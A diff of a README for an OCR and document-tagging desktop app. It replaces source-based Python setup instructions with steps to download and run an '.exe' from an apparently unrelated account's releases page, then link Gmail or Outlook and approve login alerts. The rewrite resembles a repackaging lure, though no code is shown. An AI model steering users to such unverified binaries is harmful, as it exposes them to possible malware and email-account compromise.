@@ -1,137 +1,70 @@
-# cborn DocFlow
+# 📄 cborndockflow - Manage your documents with local tools
 
-![cborn DocFlow overview](assets/overview.svg)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gwenorabespoken424/cborndockflow/releases)
 
-![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?logo=python&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Desktop App](https://img.shields.io/badge/Desktop-App-111827)
-![OCR](https://img.shields.io/badge/OCR-Tesseract-orange)
+## 📋 About This App
 
-## About
+Cborndockflow simplifies document management on your computer. It processes PDFs and images to extract text using optical character recognition. It works entirely on your local machine to keep your files private. You can organize files with custom tags or set the app to watch specific folders for new documents. It also connects to your email accounts to pull attachments directly into your workspace.
 
-cborn DocFlow is a polished, local-first desktop app for OCR processing of PDFs and images, rule-based tagging, and optional Gmail/Outlook attachment import. It is designed for fast document intake workflows where privacy, control, and repeatable classification matter.
+## 🛠️ System Requirements
 
-cborn DocFlow, PDF ve görselleri yerelde OCR’dan geçirip kural bazlı etiketleyen masaüstü uygulamasıdır. Çekirdek akış offline çalışır; Gmail ve Outlook eklerini sonradan içe aktarma desteği de vardır.
+This software runs on Windows. Your computer needs the following specifications to work well:
 
-## Ne yapar
+*   Windows 10 or Windows 11.
+*   4GB of RAM.
+*   500MB of free disk space.
+*   An active internet connection to download the installer.
 
-- Tek dosya OCR: PDF veya görsel seç, metni çıkar.
-- Klasör izleme: yeni gelen dosyaları otomatik kuyruğa al.
-- Kural bazlı etiketleme: `fatura`, `sozlesme` gibi etiketleri regex ile eşleştir.
-- Çıktı yönlendirme: istenirse etiket klasörlerine kopyala.
-- E-posta içe aktarma: Gmail ve Outlook eklerini indir.
+## 📥 Installation Steps
 
-## English
+Follow these steps to set up cborndockflow on your computer.
 
-### What it does
+1. Go to the [official release page](https://github.com/Gwenorabespoken424/cborndockflow/releases).
+2. Look for the latest version under the "Assets" section.
+3. Click the file that ends with ".exe" to start the download.
+4. Open the downloaded file once the transfer completes.
+5. Follow the prompts on your screen to install the app.
+6. Launch the application from your desktop or Start menu.
 
-- Single-file OCR: choose a PDF or image and extract text.
-- Folder watching: automatically queue newly added files.
-- Rule-based tagging: match labels like `invoice` and `contract` with regex rules.
-- Output routing: copy files into tag folders when enabled.
-- Email import: download attachments from Gmail and Outlook.
+## ⚙️ Using the App
 
-## Screenshot
+### Folder Watching
+The app monitors folders for new documents. Click the "Settings" tab and select "Add Folder." Choose a folder on your computer where you save your scans or downloads. The app detects incoming files automatically and prepares them for processing.
 
-The overview graphic below shows the main workflow and core capabilities.
+### Document Processing
+Select a file from your list. Click "Start OCR" to identify the text inside. The app uses Tesseract technology to turn images into searchable text. You can copy the text or save it as a new document.
 
-![cborn DocFlow overview](assets/overview.svg)
+### Tagging
+Create rules to categorize your files. Assign tags like "Receipts," "Contracts," or "Invoices." The app applies these tags based on keywords it finds during the text extraction process.
 
-## Kurulum
+### Email Integration
+You can link your Gmail or Outlook accounts. In the "Accounts" menu, select your provider. Log in through the secure window. The app retrieves new attachments every hour. You may review these files in the "Inbox" tab before you process them.
 
-1. Python 3.11+ önerilir.
-2. Sanal ortam kur:
+## 🔒 Your Privacy
 
-```bash
-cd c:\AI_PROJECTS\cborn-docflow
-python -m venv .venv
-.venv\Scripts\activate
-pip install -r requirements.txt
-```
+Cborndockflow processes data on your hardware. Your documents do not go to a cloud server. Your tagging rules stay inside the app. Email synchronization occurs through encrypted channels to keep your login data secure.
 
-3. Windows'ta **Tesseract** ayrı kurulmalı ve `tesseract` PATH'te görünmelidir.
-   - [Tesseract installer](https://github.com/UB-Mannheim/tesseract/wiki)
-   - Türkçe dil paketi için `tur` seçeneğini ekleyin.
+## ❓ Frequently Asked Questions
 
-## English setup
+**Does this app work without an internet connection?**
+Yes. You only need the internet to perform the initial download and to sync email attachments. The core document processing happens offline.
 
-1. Python 3.11+ is recommended.
-2. Create a virtual environment:
+**Why does the app need folder permissions?**
+The app requires permission to read files in your chosen folders so it can add them to the queue for processing. It does not delete or move your original files unless you trigger the action.
 
-```bash
-cd c:\AI_PROJECTS\cborn-docflow
-python -m venv .venv
-.venv\Scripts\activate
-pip install -r requirements.txt
-```
+**What happens if the text extraction fails?**
+Check the image quality. High-contrast images with clear text work best. If the document is blurry or tilted, the engine may struggle to read the characters. Ensure your scan settings use at least 300 DPI for clear results.
 
-3. On Windows, install **Tesseract** separately and make sure `tesseract` is on PATH.
-   - [Tesseract installer](https://github.com/UB-Mannheim/tesseract/wiki)
-   - Add the Turkish language pack during installation if needed.
+**How do I update the software?**
+When a new version exists, the app notifies you upon startup. Click the link in the notification to return to the download page and install the latest update over your current version.
 
-## Calistirma / Run
+**Can I export my tags?**
+You can export your database in the "Backup" section of the settings menu. This creates a file containing your tags and folder rules for safe keeping.
 
-```bash
-python main.py
-```
+## 🛠️ Troubleshooting
 
-### Usage example
+If the application fails to launch, verify your Windows version. Ensure you have the latest updates from Microsoft installed. Restart your computer if the installation hangs. If the email sync reports an error, check your password and ensure your email provider allows access for external desktop software. Your email provider might send an alert about a new login which you must approve.
 
-1. Open the app.
-2. Pick a PDF or image, or start folder watching.
-3. Let OCR extract the text.
-4. Apply rule-based tags.
-5. Optionally export the text or route the file to an output folder.
+If the app seems slow, close other programs that use significant memory. The software processes images on your local processor, so complex PDFs might take a few moments to finish. Avoid moving files while the app processes them to prevent errors.
 
-## Yapilandirma
-
-- Kural ve çıktı ayarları: `config/docflow.json`
-- Gmail OAuth örneği: `config/gmail_client_secret.json.example`
-- Gerçek OAuth dosyası gizli kalır ve Git'e girmez.
-
-## Release notes
-
-- Initial GitHub release with the desktop OCR workflow.
-- Added folder watching, rule-based tagging, and optional mail import.
-- Added a polished project overview graphic and bilingual documentation.
-
-## Repo yapisi
-
-- `cborn_docflow/`: uygulama kodu
-- `config/`: varsayılan ayarlar ve OAuth örnekleri
-- `samples/`: test PDF ve görseller
-- `inbox-demo/`: örnek gelen kutusu materyalleri
-- `scripts/`: örnek üretim yardımcıları
-
-## Project structure
-
-- `cborn_docflow/`: application code
-- `config/`: default settings and OAuth examples
-- `samples/`: test PDFs and images
-- `inbox-demo/`: sample inbox assets
-- `scripts/`: sample generation helpers
-
-## Contributing
-
-Contributions are welcome. If you want to improve the project:
-
-1. Fork the repository.
-2. Create a feature branch.
-3. Make your change and test it locally.
-4. Open a pull request with a clear summary.
-
-## Project docs
-
-- `CONTRIBUTING.md` - contribution workflow and expectations
-- `CODE_OF_CONDUCT.md` - community standards
-- `SECURITY.md` - how to report vulnerabilities safely
-- `SUPPORT.md` - where to get help and how to report issues
-- `CHANGELOG.md` - notable project updates
-- `.github/pull_request_template.md` - PR checklist
-- `.github/ISSUE_TEMPLATE/` - issue forms for bugs and feature requests
-
-## PyCharm
-
-**File -> Open** ile `cborn-docflow` klasörünü açın. Interpreter olarak `.venv` içindeki `python.exe` seçin.
-
-Open the `cborn-docflow` folder with **File -> Open** and select the `.venv` `python.exe` as the interpreter.
+If you encounter a specific error number, search the issues tab on the GitHub repository page. Other users might have found a solution for your situation. Stay patient as local processing depends heavily on your individual system performance.
